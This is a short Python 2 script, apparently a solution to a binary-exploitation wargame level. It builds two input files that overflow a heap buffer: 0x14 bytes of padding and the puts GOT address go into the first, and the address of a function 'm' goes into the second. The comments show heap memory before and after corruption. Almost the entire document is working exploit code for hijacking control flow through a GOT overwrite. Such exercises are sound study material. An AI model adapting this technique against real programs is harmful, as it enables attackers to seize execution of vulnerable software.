#!/usr/bin/env python2
import struct
# functions main, m

# from
# 0x804a008:      0x00000001      0x0804a170      0x00000000      0x00000011
# 0x804a018:      0x00000000      0x00000000      0x00000000      0x00000011
# 0x804a028:      0x00000002      0x0804a190      0x00000000      0x00000011

# to
# 0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
# 0x804a018:      0x61616161      0x61616161      0x61616161      0x61616161
# 0x804a028:      0x61616161      0x08049928      0x00000000      0x00000011

arg1 = open("arg1", "w+")
arg2 = open("arg2", "w+")

pad = 'a' * 0x14
# overwrite puts
# 0x08049928
pad += struct.pack("<I", 0x8049928)
arg1.write(pad)

# m location
# 0x080484f4
arg2.write(struct.pack("<I", 0x080484f4))
